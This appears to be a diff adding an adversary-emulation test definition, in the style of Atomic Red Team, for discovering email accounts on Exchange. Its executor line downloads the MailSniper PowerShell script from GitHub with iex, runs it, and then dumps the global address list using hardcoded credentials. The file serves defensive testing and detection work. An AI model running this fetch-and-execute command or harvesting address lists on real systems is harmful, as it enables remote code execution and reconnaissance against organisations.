@@ -1,0 +1,24 @@
+attack_technique: T1087.003A
+display_name: 'Account Discovery: Email Account'
+atomic_tests:
+- name: Enumerate all Eamil Accounts
+  auto_generated_guid: 3f1b5096-0139-4736-9b78-19bcb02b2346
+  description: |
+    Get a listing of email addresses and accounts.
+    In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.
+    Note: Tools such as MailSniper can be used to collect email accounts.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Output file path
+      type: String
+      default: $env:TEMP\global-address-list.txt    
+  executor:
+    command: |
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1')
+      Get-GlobalAddressList -ExchHostname user@contoso.com -UserName contoso\user -Password At0micStrong -OutFile #{output_file}
+    cleanup_command: |
+      Remove-Item #{output_file} -Force -ErrorAction Ignore
+    name: powershell
+
